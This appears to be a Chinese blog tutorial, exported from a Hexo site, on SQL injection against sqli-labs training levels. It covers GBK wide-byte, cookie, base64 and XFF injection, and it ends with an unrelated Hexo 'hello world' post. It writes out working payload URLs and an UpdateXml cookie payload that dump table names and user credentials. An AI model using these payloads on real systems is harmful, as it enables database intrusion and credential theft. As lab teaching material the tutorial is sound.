PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。 大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\\’ = %df%5c%27=縗’，有了单引号就好注入了。 宽字字节注入实列sqli-32 题 [测试靶场地址][http://43.247.91.228:84/Less-32/?id=1] 思路： 由于单引号被过滤了，所以我们使用%df吃掉 \\， 具体的原因是urlencode(\\&#39;) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。 将 &#39; 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。 注入实操： （1） 构造代码，成功绕过，payload如下： http://localhost:81/sqli-labs-master/Less-32/index.php?id=1%df%27 and 1=1--+ （2）order by查询字段数 http://localhost:81/sqli-labs-master/Less-32/index.php?id=1%df%27 order by 4--+ (3)union selec联合查询 http://localhost:81/sqli-labs-master/Less-32/index.php?id=0%df%27 union select 1,2,3--+ 其他的都是一样的了、。。。。。。。。。。。 http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 and 1=1--+ http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 and 1=1--+ http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 oder by 3--+ http://localhost:81/sqli-labs-master/Less-33/index.php?id=0%df%5c%27 union select 1,2,3--+ http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,database(),3--+ http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+ http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3--+ http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(username,password) from users),3--+ 宽字节注入代码分析在宽字节注入页面中，程序获取GET参数ID，并对参数ID使用addslashes()转义，然后拼接到SQL语句中，进行查询; 当访问id=1‘时，执行的SQL语句： SELECT * FORM users WHWRE id=’1\\’’ 可以看到单引号被转义符“\\”转义，所以在一般情况下，是无法注入的，但由于在数据库查询前执行了SET NAMES ‘GBK’,将编码设置为宽字节GBK，所以此处存在宽字节注入漏洞， 在php中，通过iconv（）进行编码转换时，也可能存在宽字符注入漏洞。 Cookie 注入攻击 通常我们的开发人员在开发过程中会特别注意到防止恶意用户进行恶意的注入操作，因此会对传入的参数进行适当的过滤，但是很多时候，由于个人对安全技术了解的不同，有些开发人员只会对get,post这种方式提交的数据进行参数过滤。 但我们知道，很多时候，提交数据并非仅仅只有get\\post这两种方式，还有一种经常被用到的方式：request(“xxx”),即request方法 通过这种方法一样可以从用户提交的参数中获取参数值，这就造成了cookie注入的最基本条件：使用了request方法，但是注入保护程序中只对get\\post方法提交的数据进行了过滤。 Cookie注入攻击实列[靶场地址][http://43.247.91.228:84/Less-20/] 这关是一个Cookie处的注入,输入正确的账号密码后，会跳到index.php页面，如下图 这个时候再访问登陆页面的时候http://43.247.91.228:84/Less-20/还是上面的页面，因为登陆后将信息存在了Cookie中，后台进行判断，发现Cookie中有值时会显示上面的个人信息，而不是登录框。 在上面哪些信息中可以看到，多出了一个Your ID：8，这个信息很有可能是从数据库中查询出来的，我们再次访问该页面，使用burp抓包分析 可以看到Cookie中有uname=admin，说明后台很有可能利用cookie中的uname取数据库中进行查询操作。 将cookie中的信息改为uname=admin’ 页面报错了，并且从报错信息中可以看出，后台使用的是单引号进行的拼凑。后面没有必要继续下去了，联表查询、报错注入、盲注在这里都是可以的。 继续使用burp进Cookie: uname=admin&#39; AND UpdateXml(1,concat(0x7e,(select username from users LIMIT 1,1),0x7e),1)# ; 得到： Cookie 注入代码分析通过$_COOKIE能获取浏览器cookie中的数据，在cookie注入页面中程序通过$_COOKIE获取参数ID，然后直接将ID拼接到slect语句中进行查询，如果有结果则将结果输出到页面。 这里可以看到，由于没有过滤cookie中的参数ID且直接拼接到SQL语句中，所以存在SQL注入漏洞。当在cookie中添加id=1 union select 1,2,3%23时，执行的SQL语句为： Select * from users where ‘id’=1 union select 1,2,3# 此时,SQL语句可以分为select * from users where ‘id’ =1 和 union select 1,2,3两条，利用第二条语句就可以获取数据库中的数据。 [ 0 ]Base64 注入攻击Base64 注入代码分析在base64 注入页面中，程序获取GET参数ID，利用base64_decode()对参数ID进行base64解码，然后直接将解码后的$id拼接到select语句中进行查询，通过while循环将查询结果输出到页面。 由于代码没有过滤解码后的$id,且将$id直接拼接到SQL语句中，所以存在SQL注入漏洞。当访问id=1 union select 1,2,3#时，执行的SQL语句为： Select * from users wheren ‘id’=1 union select 1,2,3# 此时SQL语句可以分为select * form users where ‘id’=1和union select 1,2,3两条，利用第二条语句就可以获取数据库中的数据。 [ 0 ]XFF注入攻击XFF注入代码分析PHP 中的getenv()函数用于获取一个环境变量的值，类似于$_SERVER或$_ENV,返回环境变量对应的值，如果环境变量不存在则返回FALSE。 使用以下代码即可获取客户端IP地址，程序先判断是否存在HTTP头部参数","categories":[],"tags":[]},{"title":"","slug":"hello-world","date":"2019-08-07T07:54:58.457Z","updated":"2019-08-07T10:10:00.160Z","comments":true,"path":"2019/08/07/hello-world/","link":"","permalink":"http://yoursite.com/2019/08/07/hello-world/","excerpt":"title: 你好访问者Hello World","text":"title: 你好访问者Hello World Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}